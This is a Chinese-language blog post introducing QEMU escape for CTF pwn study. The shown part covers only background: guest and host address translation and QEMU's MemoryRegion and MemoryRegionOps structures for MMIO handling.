<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>qemu-escape初识 | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="qemu-escape">
<meta property="og:type" content="article">
<meta property="og:title" content="qemu-escape初识">
<meta property="og:url" content="https://ixout.github.io/posts/28098/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="qemu-escape">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/1ccabf1b.jpg">
<meta property="article:published_time" content="2024-04-18T10:51:37.000Z">
<meta property="article:modified_time" content="2024-11-20T14:11:46.228Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="qemu-escape">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/1ccabf1b.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/28098/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'qemu-escape初识',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-20 22:11:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">56</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/1ccabf1b.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">qemu-escape初识</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-18T10:51:37.000Z" title="发表于 2024-04-18 18:51:37">2024-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-20T14:11:46.228Z" title="更新于 2024-11-20 22:11:46">2024-11-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">11.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>51分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>参考:</strong></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6562?time__1311=n4%2BxnD0DRDBAi%3DGkDgiDlhjmYE%3Dx907Q2GlYD">qemu pwn-基础知识 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-265501.htm">原创]QEMU逃逸初探-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/virtualization/qemu/basic-knowledge/mm/">QEMU 内存管理 - CTF Wiki (ctf-wiki.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://arttnbmy.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/">【HARDWARE.0x00】PCI 设备简易食用手册 - arttnbmy’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/edver/p/14684143.html">QOM模型初始化流程 - Edver - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.owalle.com/2018/12/26/qemu-qom/">利用QOM(Qemu Object Model)创建虚拟设备 | Yi颗烂樱桃 (owalle.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://martins3.github.io/qemu/qom.html">QEMU 中的面向对象 : QOM | Deep Dark Fantasy (martins3.github.io)</a></p>
<h1 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h1><p>QEMU（Quick Emulator）是一个开源的虚拟机监控器和仿真器，可以在多种主机架构之间进行硬件级别的虚拟化。它允许用户在一台计算机上运行不同架构的操作系统，比如在x86架构的计算机上运行ARM架构的操作系统。QEMU可以模拟处理器、内存、存储设备、网络接口等硬件，并提供了一组工具和库来管理虚拟化环境。它被广泛用于开发、测试和调试操作系统、应用程序和嵌入式系统。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/876323_SFNDT7H88YVDYUK.jpg" alt=""></p>
<h2 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h2><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>在虚拟机中不论是kvm还是qemu有几个关键的地址。</p>
<p>GVA：guest virtual address（虚拟机中的虚拟地址）</p>
<p>GPA：guest physical address（虚拟机中的物理地址）</p>
<p>HVA：host virtual address（宿主机中的虚拟地址）</p>
<p>HPA： host physical address（宿主机中的物理地址）</p>
<p>整体地址的话：从GVA -&gt; GPA -&gt; HVA -&gt; HPA 这样的转换。</p>
<p>而GPA实际是由宿主机进程mmap出来的空间。</p>
<p>而在qemu-kvm架构下，<strong>QEMU充当kvm的前端，传递IO。kvm负责做内存以及CPU的虚拟化。</strong></p>
<p>qemu进行会为虚拟机mmap分配出相应虚拟机申请大小的内存，用于给该虚拟机当作物理内存(在虚拟机进程中只会看到虚拟地址)</p>
<p>例如,qemu虚拟机对应的内存为1G，虚拟机启动后查看qemu的地址空间，可以看到存在一个大小为<code>0x40000000</code>内存空间，即为该虚拟机的物理内存。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fe37fe00000     0x7fe3bfe00000 rw-p 40000000 0 ;虚拟机对应的内存</span><br></pre></td></tr></table></figure>
<h3 id="GUEST视角"><a href="#GUEST视角" class="headerlink" title="GUEST视角"></a>GUEST视角</h3><h4 id="MemoryRegion"><a href="#MemoryRegion" class="headerlink" title="MemoryRegion"></a>MemoryRegion</h4><p>在 Qemu 当中使用 <code>MemoryRegion</code> 结构体类型来表示一块具体的 Guest 物理内存区域，该结构体定义于 <code>include/exec/memory.h</code> 当中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 表示一块内存区域的一个结构体.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;    <span class="comment">// 指向父 MemoryRegion</span></span><br><span class="line">    Int128 size;    <span class="comment">// 内存区域大小</span></span><br><span class="line">    hwaddr addr;    <span class="comment">// 在父 MR 中的偏移量</span></span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;    <span class="comment">// 仅在 alias MR 中，指向实际的 MR</span></span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在 Qemu 当中有三种类型的 MemoryRegion：</p>
<ul>
<li>MemoryRegion 根：通过 <code>memory_region_init()</code> 进行初始化，其用以表示与管理由多个 sub-MemoryRegion 组成的一个内存区域，并不实际指向一块内存区域，例如 <code>system_memory</code>。</li>
<li>MemoryRegion 实体：通过 <code>memory_region_init_ram()</code> 初始化，表示具体的一块大小为 size 的内存空间，指向一块具体的内存。</li>
<li>MemoryRegion 别名：通过 <code>memory_region_init_alias()</code> 初始化，作为另一个 MemoryRegion 实体的别名而存在，不指向一块实际内存。</li>
</ul>
<p>MR 容器与 MR 实体间构成树形结构，其中容器为根节点而实体为子节点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                       struct MemoryRegion</span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |name                    |                                         </span><br><span class="line">                       |  (const char *)        |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |addr                    |                                         </span><br><span class="line">                       |  (hwaddr)              |                                         </span><br><span class="line">                       |size                    |                                         </span><br><span class="line">                       |  (Int128)              |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                       |subregions              |                                         </span><br><span class="line">                       |    QTAILQ_HEAD()       |                                         </span><br><span class="line">                       +------------------------+                                         </span><br><span class="line">                                  |</span><br><span class="line">                                  |</span><br><span class="line">          ----+-------------------+---------------------+----</span><br><span class="line">              |                                         |</span><br><span class="line">              |                                         |</span><br><span class="line">              |                                         |</span><br><span class="line"></span><br><span class="line">struct MemoryRegion                            struct MemoryRegion</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|name                    |                     |name                    |</span><br><span class="line">|  (const char *)        |                     |  (const char *)        |</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|addr                    |                     |addr                    |</span><br><span class="line">|  (hwaddr)              |                     |  (hwaddr)              |</span><br><span class="line">|size                    |                     |size                    |</span><br><span class="line">|  (Int128)              |                     |  (Int128)              |</span><br><span class="line">+------------------------+                     +------------------------+</span><br><span class="line">|subregions              |                     |subregions              |</span><br><span class="line">|    QTAILQ_HEAD()       |                     |    QTAILQ_HEAD()       |</span><br><span class="line">+------------------------+                     +------------------------+</span><br></pre></td></tr></table></figure>
<p>相应地，基于 OOP 的思想，MemoryRegion 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Memory region callbacks</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionOps</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="type">uint64_t</span> (*read)(<span class="type">void</span> *opaque,</span><br><span class="line">                     hwaddr addr,</span><br><span class="line">                     <span class="type">unsigned</span> size);</span><br><span class="line">    <span class="comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span></span><br><span class="line">    <span class="type">void</span> (*write)(<span class="type">void</span> *opaque,</span><br><span class="line">                  hwaddr addr,</span><br><span class="line">                  <span class="type">uint64_t</span> data,</span><br><span class="line">                  <span class="type">unsigned</span> size);</span><br><span class="line"></span><br><span class="line">    MemTxResult (*read_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                   hwaddr addr,</span><br><span class="line">                                   <span class="type">uint64_t</span> *data,</span><br><span class="line">                                   <span class="type">unsigned</span> size,</span><br><span class="line">                                   MemTxAttrs attrs);</span><br><span class="line">    MemTxResult (*write_with_attrs)(<span class="type">void</span> *opaque,</span><br><span class="line">                                    hwaddr addr,</span><br><span class="line">                                    <span class="type">uint64_t</span> data,</span><br><span class="line">                                    <span class="type">unsigned</span> size,</span><br><span class="line">                                    MemTxAttrs attrs);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">device_endian</span> <span class="title">endianness</span>;</span></span><br><span class="line">    <span class="comment">/* Guest可见约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span></span><br><span class="line"><span class="comment">         * accesses throw machine checks.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="type">bool</span> unaligned;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若存在且 #false, 则该事务不会被设备所接受</span></span><br><span class="line"><span class="comment">         * (并导致机器的相关行为，例如机器检查异常).</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">bool</span> (*accepts)(<span class="type">void</span> *opaque, hwaddr addr,</span><br><span class="line">                        <span class="type">unsigned</span> size, <span class="type">bool</span> is_write,</span><br><span class="line">                        MemTxAttrs attrs);</span><br><span class="line">    &#125; valid;</span><br><span class="line">    <span class="comment">/* 内部应用约束: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最小的实现的 size .</span></span><br><span class="line"><span class="comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> min_access_size;</span><br><span class="line">        <span class="comment">/* 若非 0，则决定了最大的实现的 size . </span></span><br><span class="line"><span class="comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> max_access_size;</span><br><span class="line">        <span class="comment">/* 若为 true, 支持非对齐的访问.  </span></span><br><span class="line"><span class="comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">bool</span> unaligned;</span><br><span class="line">    &#125; impl;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当我们的 Guest 要读写虚拟机上的内存时，在 Qemu 内部实际上会调用 <code>address_space_rw()</code>，对于一般的 RAM 内存而言则直接对 MR 对应的内存进行操作，对于 MMIO 而言则最终调用到对应的 <code>MR-&gt;ops-&gt;read()</code> 或 <code>MR-&gt;ops-&gt;write()</code>。</p>
